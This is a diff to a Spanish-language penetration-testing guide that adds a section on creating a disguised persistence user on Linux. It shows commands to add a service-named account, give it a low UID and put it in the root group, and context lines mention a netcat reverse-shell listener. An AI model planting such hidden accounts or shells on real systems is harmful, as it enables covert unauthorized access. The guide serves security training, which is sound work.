@@ -115,5 +115,27 @@ crontab -i cron
 
 Para establecer una conexión a partir de este momento basta con crear un listener en nuestra máquina kali con `nc -nvlp puerto_kali` y esperar a que se ejecute el comando en el objetivo.
 
+### Creando un usuario
+
+El usuario debería pasar lo más desapercibido posible, por lo que se pueden ajustar algunos parámetros para evitar reducir el riesgo de detección:
+
+- Dar el nombre de un servicio: por ejemplo `FTP`.
+- Directorio home legítimo: `/var/www-data`
+- UID coherente:
+	- **UID 0:** root.
+	- **UID 1–99:** históricamente reservados para cuentas del sistema en muchas distribuciones, aunque los rangos exactos varían.
+	- **UID 100–999:** frecuentemente cuentas de sistema/servicio en distribuciones modernas.
+	- **UID ≥1000:** normalmente usuarios humanos/no sistema en muchas distribuciones actuales.
+
+```console
+usr@hostname# useradd -m -d /var/www -s /bin/bash www-data
+usr@hostname# passwd www-data
+usr@hostname# usermod -aG root www-data
+usr@hostname# usermod -u 15 www-data
+usr@hostname# groupmod -g 15 www-data 
+```
+
+La opción `-d` indica el directorio que se va a usar como home, y `-m` lo crea en caso de que no exista. Las opciones `-u` de `usermod` y `-g` de `groupmod` sirven para modificar el UID y GID respectivamente.
+
 [⟵ Anterior](07_linux_privesc.md) | [Siguiente ⟶](09_winhash.md)
 
